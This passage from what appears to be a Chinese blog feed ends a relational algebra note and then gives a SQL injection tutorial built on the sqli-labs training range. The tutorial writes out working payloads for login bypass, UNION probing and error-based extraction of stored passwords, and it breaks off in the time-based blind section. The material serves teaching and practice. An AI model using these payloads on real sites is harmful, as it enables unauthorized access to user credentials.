关系代数</h2>\n<p>关系代数</p>\n<ul>\n<li>一种抽象的查询语言</li>\n<li>用对关系的运算来表达查询</li>\n</ul>\n<p>关系代数的三个要素</p>\n<ul>\n<li>运算对象：关系</li>\n<li>运算结果：关系</li>\n<li>运算符：4 类</li>\n</ul>\n<p>集合运算符（）&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzQ3NTc2NjYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923174757666.png</span>&quot; alt=&quot;image-20220923174757666&quot; style=&quot;zoom: 50%;&quot; /&gt;</p>\n<ul>\n<li>将关系看成元组的集合</li>\n<li>运算是从关系的 “水平” 方向即行的角度来进行</li>\n</ul>\n<p>专门的关系运算符 &lt; img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3RlLTEzMTEzMzU0MjcuY29zLmFwLXNoYW5naGFpLm15cWNsb3VkLmNvbS9pbWFnZXMvaW1hZ2UtMjAyMjA5MjMxNzUwMDc3ODYucG5n\">https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220923175007786.png</span>&quot; alt=&quot;image-20220923175007786&quot; style=&quot;zoom:50%;&quot; /&gt;</p>\n<ul>\n<li>不仅涉及行而且涉及列</li>\n</ul>\n<p>关系代数运算的分类</p>\n<ul>\n<li>\n<p>传统的集合运算</p>\n<p>并、差、交、广义笛卡尔积</p>\n</li>\n<li>\n<p>专门的关系运算</p>\n<p>选择、投影、连接、除</p>\n</li>\n</ul>\n",
            "tags": [
                "关系数据库",
                "数据库"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/24/sql%E6%B3%A8%E5%85%A5/",
            "url": "https://blog.xcu.icu/2022/10/24/sql%E6%B3%A8%E5%85%A5/",
            "title": "SQL注入",
            "date_published": "2022-10-23T16:00:00.000Z",
            "content_html": "<h2 id=\"什么是sql注入\"><a class=\"anchor\" href=\"#什么是sql注入\">#</a> 什么是 sql 注入</h2>\n<p>学一个漏洞我们应该知道，漏洞的危害，成因、原理、攻击方式，以及防御方式。所以这里首先聊一聊什么是 sql 注入，SQL 注入分类于 web 安全漏洞，通过 sql 注入攻击者可以干扰应用程序对其数据库进行查询。它通常允许攻击者查看他们正常无法检索到的数据。许多情况下攻击者可以对数据库进行增删改查的操作</p>\n<h2 id=\"sql注入的危害\"><a class=\"anchor\" href=\"#sql注入的危害\">#</a> sql 注入的危害</h2>\n<p>前面说完了什么是 sql 注入，接下来我们聊一聊 sql 注入漏洞造成的危害，sql 注入成功后我们不仅可以像上面提到是那样对各种数据进行增删改查，如果网站目录存在写入权限我们可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等，甚至可以通过提权等操作获取服务器最高权限来远程控制服务器，安装后门，修改或者控制操作系统</p>\n<h2 id=\"sql注入的成因\"><a class=\"anchor\" href=\"#sql注入的成因\">#</a> sql 注入的成因</h2>\n<p>sql 漏洞的成因很简单，就是开发过程没有对用户的输入进行严格的过滤，开发人员违背了 “代码与数据分离” 原则。一方面，攻击者可以任意更改输入数据；另一方面，攻击者可以在数据里构造代码，让服务器端把数据解析成代码执行。攻击者通过把 SQL 命令插入到 Web 表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。</p>\n<h2 id=\"sql注入的分类\"><a class=\"anchor\" href=\"#sql注入的分类\">#</a> SQL 注入的分类</h2>\n<h3 id=\"有回显的注入\"><a class=\"anchor\" href=\"#有回显的注入\">#</a> 有回显的注入</h3>\n<ol>\n<li>联合查询</li>\n<li>报错注入</li>\n<li>通过注入进行 DNS 请求，达到回显的目的</li>\n</ol>\n<h3 id=\"无回显的注入\"><a class=\"anchor\" href=\"#无回显的注入\">#</a> 无回显的注入</h3>\n<ol>\n<li>Bool 盲注</li>\n<li>时间盲注</li>\n</ol>\n<h3 id=\"二次注入\"><a class=\"anchor\" href=\"#二次注入\">#</a> 二次注入</h3>\n<p>一种业务逻辑复杂的题目，一般需要自己编写脚本来实现自动化注入</p>\n<h2 id=\"where子句的sql注入漏洞\"><a class=\"anchor\" href=\"#where子句的sql注入漏洞\">#</a> where 子句的 sql 注入漏洞</h2>\n<p>本笔记基于 sql-labs 靶场记录</p>\n<p>sql-labs 第一关</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE id='<span class=\"token interpolation\"><span class=\"token variable\">$id</span></span>' LIMIT 0,1\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<ul>\n<li>所有详细信息（*）</li>\n<li>从 users 表中</li>\n<li>其中类别是 id</li>\n<li>limit 0,1 表示的是从第一条记录开始，只取一条</li>\n</ul>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysql_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysql_fetch_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;br>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>这里会将 sql 查询的结果返回，这一关并没有进行任何的过滤，所以攻击者可以构建</p>\n<p><pre class=\"line-numbers language-payload\" data-language=\"payload\"><code class=\"language-payload\">http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli-labs-master&#x2F;Less-1&#x2F;?id&#x3D;1&#39;--<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925110237019.png\" alt=\"image-20220925110237019\" /></p>\n<p>这里的关键是两个减号在 SQL 中是注释指示符，意味着查询的其余部分被解释为注释。这将使得原有的语句后部分无法被包含，也就可以突破 limit 0,1 的限制查询到所有的数据</p>\n<h3 id=\"颠覆应用逻辑\"><a class=\"anchor\" href=\"#颠覆应用逻辑\">#</a> 颠覆应用逻辑</h3>\n<p>sql-labs 第 11 关</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"SELECT * FROM users WHERE username='<span class=\"token interpolation\"><span class=\"token variable\">$uname</span></span>' and password='<span class=\"token interpolation\"><span class=\"token variable\">$passwd</span></span>' LIMIT 0,1\"</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>一个登录页面，判断用户输入在数据库中能不能查询到，如果查询到则登录，查询不到这则拒绝，这里攻击者只需要使用 SQL 注释将密码的判断注释掉这可以直接用用户名登录<br />\n如这里有一个 admin 用户只需要在用户名处输入 admin'# 即可登录</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'admin'</span><span class=\"token comment\">#' and password='' LIMIT 0,1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>这时只判断了 admin 是否存在，但是这里还需要知道用户名，有没有一种方法不用用户名也能登录呢，有的</p>\n<p>我们使用上面有用到的 or</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925113956855.png\" alt=\"image-20220925113956855\" /></p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">SELECT</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">FROM</span> users <span class=\"token keyword\">WHERE</span> username<span class=\"token operator\">=</span><span class=\"token string\">'1'</span> <span class=\"token operator\">or</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token comment\">#' and password='' LIMIT 0,1</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>这里 or 是并运算，那么前后只需要成立一个便可<img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220925114457385.png\" alt=\"image-20220925114457385\" /></p>\n<p>这里是可以执行成功的</p>\n<h2 id=\"联合查询的sql注入\"><a class=\"anchor\" href=\"#联合查询的sql注入\">#</a> 联合查询的 SQL 注入</h2>\n<p>当应用程序容易受到 SQL 注入的攻击，并且在应用程序的响应中返回查询结果时，可以使用关键字从数据库中的其他表中检索数据。这会导致 SQL 注入联合攻击。<em><strong>UNION</strong></em> 该关键字允许您执行一个或多个附加查询，并将结果追加到原始查询</p>\n<p>使用 UNION 需要满足两个条件</p>\n<ol>\n<li>各个查询必须返回相同数量的列。</li>\n<li>每列中的数据类型必须在各个查询之间兼容。</li>\n</ol>\n<h3 id=\"确定sql注入攻击中所需要的列数\"><a class=\"anchor\" href=\"#确定sql注入攻击中所需要的列数\">#</a> 确定 SQL 注入攻击中所需要的列数</h3>\n<p>有两个方法可以判断</p>\n<p>第一种方法涉及注入一系列子句并递增指定的列索引，直到发生错误</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' ORDER BY 1--\n'</span> <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token number\">2</span><span class=\"token comment\">--</span>\n' <span class=\"token keyword\">ORDER</span> <span class=\"token keyword\">BY</span> <span class=\"token number\">3</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>第二种方法涉及提交一系列有效负载，指定不同数量的 值</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span>\n' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>上面都是当列数不匹配时会返回错误</p>\n<h3 id=\"查找具有有用数据类型的列\"><a class=\"anchor\" href=\"#查找具有有用数据类型的列\">#</a> 查找具有有用数据类型的列</h3>\n<p>要检索的相关数据将采用字符串形式，因此您需要在原始查询结果中查找数据类型为字符串数据或与字符串数据兼容的一列或多列。</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token string\">' UNION SELECT '</span>a<span class=\"token string\">',NULL,NULL,NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token comment\">--</span>\n<span class=\"token string\">' UNION SELECT NULL,NULL,'</span>a<span class=\"token string\">',NULL--\n'</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token comment\">--</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h2 id=\"报错注入\"><a class=\"anchor\" href=\"#报错注入\">#</a> 报错注入</h2>\n<p>主要是三种报错注入的方式，分别是 updatexml，floor 和 exp</p>\n<h3 id=\"updatexml\"><a class=\"anchor\" href=\"#updatexml\">#</a> updatexml</h3>\n<p>原理从本质来说就是函数的报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221001004112785.png\" alt=\"image-20221001004112785\" /></p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\"><span class=\"token keyword\">select</span> updatexml<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>concat<span class=\"token punctuation\">(</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">,</span>version<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x7e</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>这里的 version 替换成查询语句即可，下面是两个例子</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&#39;) and updatexml(1,concat(0x7e,database(),0x7e),1)#\n&#39;) and updatexml(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e),1)#<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<h3 id=\"floor\"><a class=\"anchor\" href=\"#floor\">#</a> floor</h3>\n<p><strong>关键函数：</strong><br />\n<strong>Rand () ------- 产生 0~1 的伪随机数</strong></p>\n<p><strong>rand 有两种形式：</strong></p>\n<p><strong>1、rand (), 即无参数的，此时产生的随机数是随机的，不可重复的；</strong></p>\n<p><strong>2、rand (n), 即有参数数，如 rand (0), 这里 0 相当于种子，那么这里会产生一列伪随机数。</strong></p>\n<p><strong>Floor () ------- 向下取整数</strong><br />\n<strong> Concat () ----- 连接字符串</strong><br />\n<strong> Count () ------ 计算总数</strong></p>\n<p><strong>1，count(*)</strong></p>\n<p><strong>返回表中的记录数 (包括所有列)，相当于统计表的行数 (不会忽略列值为 NULL 的记录)</strong></p>\n<p><strong>2，count (列名)</strong></p>\n<p><strong>返回列名指定列的记录数</strong></p>\n<p><strong>group by x  作用以 x 为主键分组</strong></p>\n<p><strong>主键，指的是一个列或多列的组合，其值能唯一地标识表中的每一行</strong></p>\n<p><strong>其实在做的时候分为两步首先扫描一行一行的扫描主键，如果虚拟表中有值则跳过，如果没有第二步将值放入虚表中</strong></p>\n<p>*<strong> 首先 rand () 是随机生成一个 0 到 1 之间的随机数 *</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317003828506-513556717.png\" alt=\"img\" /></strong></p>\n<p><strong>然后一般在 floor 中使用是会乘以 2 既 floor (rand ()*2),floor 的作用是对数向下取整，则整个语句会形成一串伪随机 011011....。</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317003909146-1883988726.png\" alt=\"img\" /></strong></p>\n<p><strong>count (*) 的效果</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317005059387-2031388179.png\" alt=\"img\" /></strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220317004937232-708877907.png\" alt=\"img\" /></strong></p>\n<p><strong>对于 select floor (rand (0)*2),count (*) from users group by floor (rand (0)*2); 报错</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318131113712-1472090330.png\" alt=\"img\" /></strong></p>\n<p><strong>过程解析</strong></p>\n<p><strong>1，group by 时，会建立空虚拟表如下图，然后从 sql 语句执行结果序列（011011）读取数据并插入虚表:</strong></p>\n<p><strong><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318130922453-1410766243.png\" alt=\"img\" /></strong></p>\n<p>2，虚表写入第一个数据 (前一个 floor 部分进行一次计算，“第一次计算”）扫描主键，发现没有与 0 对应的主建，新建主键（这个主键的值是后面一个 floor 部分进行一次计算的值，“第二次计算”）如图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318131856877-641578374.png\" alt=\"img\" /></p>\n<p>3，写入第二个数据（前一个 floor 部分计算的值，“第三次计算”）有对应的主键 count（*）加一（这里就没有再计算后面的 floor 部分）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318132321527-1779841079.png\" alt=\"img\" /></p>\n<p>4，写入第三个数据（前一个 floor 计算的值，“第四次计算”）扫描主键，发现没有与 0 对应的主建（刚刚建的主键记录的值实际为 1），新建主键（这个主键的值是后面一个 floor 部分进行一次计算的值，“第五次计算”）新建的主键值又为 1，因为主键不能重复，所以报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220318132958429-1301912811.png\" alt=\"img\" /></p>\n<p>简单来说就是 rand 和 group by 的冲突</p>\n<p>接下来是例子</p>\n<p>') union select count(*),concat((select user()),floor(rand(0)*2))a from information_schema.columns group by a#</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220314170034190-29499768.png\" alt=\"img\" /></p>\n<p>') union select count(*),concat((select password from users),floor(rand(0)*2))a from information_schema.tables group by a#</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/2793566-20220314170056710-97820973.png\" alt=\"img\" /></p>\n<h3 id=\"exp\"><a class=\"anchor\" href=\"#exp\">#</a> exp</h3>\n<p>exp () 函数的报错原理是溢出报错</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221001005353035.png\" alt=\"image-20221001005353035\" /></p>\n<p>使用方法如上，这个地方并没有成功，暂不知是什么原因，有待解决</p>\n<h2 id=\"bool盲注\"><a class=\"anchor\" href=\"#bool盲注\">#</a> Bool 盲注</h2>\n<p>盲注一般使用在开发者将报错信息屏蔽时使用，虽然报错信息被屏蔽，但是页面会有不同的回显，常用的方式是在注入点后面加上 and 1=1 或者 and 1=2，如果存在注入点那么 and 1=2 的情况下，页面会有所不同，有些教程会把报错注入也归为盲注的一种，这里记录一下报错注入和盲注常用的函数</p>\n<h3 id=\"常用函数\"><a class=\"anchor\" href=\"#常用函数\">#</a> 常用函数</h3>\n<ol>\n<li>\n<p>截取函数</p>\n<ul>\n<li>\n<p>substr()</p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\">用法：substr(string string,num start,num length);\n\nselect  substr(参数1，参数2，参数3)  from  表名\n\nstring为字符串；start为起始位置；length为长度。\n\n注意：mysql中的start是从1开始的。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>left()</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">LEFT(str,length);\nSQL\nLEFT()函数接受两个参数：\n\nstr是要提取子字符串的字符串。length是一个正整数，指定将从左边返回的字符数。\nLEFT()函数返回str字符串中最左边的长度字符。如果str或length参数为NULL，则返回NULL值。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>right()</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">【实例】使用 RIGHT 函数返回字符串中右边的字符，输入的 SQL 语句和执行结果如下所示。\nmysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);\n+------------------+\n| RIGHT(&#39;MySQL&#39;,3) |\n+------------------+\n| SQL              |\n+------------------+\n1 row in set (0.00 sec)\n由执行结果可知，函数返回字符串“MySQL”右边开始的长度为3的子字符串，结果为“SQL”。<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n</ul>\n</li>\n<li>\n<p>转换函数</p>\n<ul>\n<li>\n<p>ascii()</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">返回字符串str的最左字符的数值。返回<span class=\"token number\">0</span>，如果str为空字符串。返回<span class=\"token boolean\">NULL</span>，如果str为<span class=\"token boolean\">NULL</span>。 ASCII<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>返回数值是从<span class=\"token number\">0</span>到<span class=\"token number\">255</span>。\n\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span>                                              <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">50</span>                                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'dx'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> ASCII<span class=\"token punctuation\">(</span><span class=\"token string\">'dx'</span><span class=\"token punctuation\">)</span>                                             <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">100</span>                                                     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n<li>\n<p>hex()</p>\n<p><pre class=\"line-numbers language-sql\" data-language=\"sql\"><code class=\"language-sql\">如果N_or_S是一个数字，返回N，其中N是一个长长<span class=\"token punctuation\">(</span><span class=\"token keyword\">BIGINT</span><span class=\"token punctuation\">)</span>数字的十六进制值的字符串表示。这等同于CONV<span class=\"token punctuation\">(</span>N，<span class=\"token number\">10</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>。\n\n\t如果N_or_S是一个字符串，返回N_or_S在N_or_S每个字符被转化为两个十六进制数字的十六进制字符串表示。\n\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t\t<span class=\"token punctuation\">(</span>adsbygoogle <span class=\"token operator\">=</span> window<span class=\"token punctuation\">.</span>adsbygoogle <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>push<span class=\"token punctuation\">(</span>&#123;&#125;<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\t\t\t\t<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> HEX<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> HEX<span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span>                                                <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> FF                                                      <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">SQL</span><span class=\"token operator\">></span> <span class=\"token keyword\">SELECT</span> <span class=\"token number\">0x616263</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">0x616263</span>                                                <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token operator\">|</span> abc                                                     <span class=\"token operator\">|</span>\n<span class=\"token operator\">+</span><span class=\"token comment\">---------------------------------------------------------+</span>\n<span class=\"token number\">1</span> <span class=\"token keyword\">row</span> <span class=\"token operator\">in</span> <span class=\"token keyword\">set</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0.00</span> sec<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n</li>\n</ul>\n</li>\n<li>\n<p>比较函数</p>\n<ul>\n<li>\n<p>if()</p>\n<p><strong>语法结构：</strong></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">if(expr1,expr2,expr3)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>上述语法结构中 expr1 表示的是判断条件，expr2 和 expr3 是符合 expr1 的自定义的返回结果</p>\n<p>当 expr1 的值为真时，则返回值为 expr2；当 expr1 的值为假时，则返回值为 expr3</p>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"时间盲注\"><a class=\"anchor\" href=\"#时间盲注\">#</a> 时间盲注</h2>\n<p>时间盲注出现的原因也是因为服务器端拼接了失去了语句但是所有的回显都被过滤，我们只能通过页面的响应时间做一个判断但是由于 sleep 和 benchmark 函数的大量执行会使得服务器的负载高，容易导致题目挂掉。</p>\n<p>做题的方法和 bool 盲注差不多，判断的方式不同，一般时间盲注常用的有两个函数 sleep 和 benchmark 函数如下表</p>\n<table>\n<thead>\n<tr>\n<th>函数名</th>\n<th>功能和使用方法</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>sleep()</td>\n<td>sleep 